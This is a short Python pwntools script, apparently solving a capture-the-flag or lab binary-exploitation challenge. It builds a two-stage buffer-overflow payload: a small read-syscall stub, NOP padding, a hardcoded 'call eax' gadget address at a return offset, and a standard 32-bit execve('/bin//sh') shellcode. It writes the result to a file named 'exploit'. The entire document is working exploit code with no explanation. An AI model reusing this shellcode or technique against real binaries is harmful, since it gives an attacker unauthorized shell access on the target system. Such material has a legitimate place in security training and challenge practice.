from pwn import *

return_offset = 18 
buf_len = 0x1f

#call_eax_gadget = p32(0x08049019)   # call eax
call_eax_gadget = p32(0x080490f8)    # sub esp, 0x14; call eax

nop = b'\x90'

execcve = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

#syscall read
sc = """xor eax, eax
push 0x3
pop eax
xor ebx, ebx
push 0x60
pop edx
int 0x80
call ecx
"""

ex = asm(sc)

if len(ex) <= return_offset:
	ex += nop * ( return_offset - len(ex))
	ex += call_eax_gadget
	
	# pad to main: call read() max bytes
	ex += nop * (buf_len - len(ex))
	
	ex += execcve
	
	with open('exploit', 'wb') as f:
		f.write(ex)
		
else:
	print("sc len > ret offset ({}) at {} bytes".format(return_offset, len(ex)))
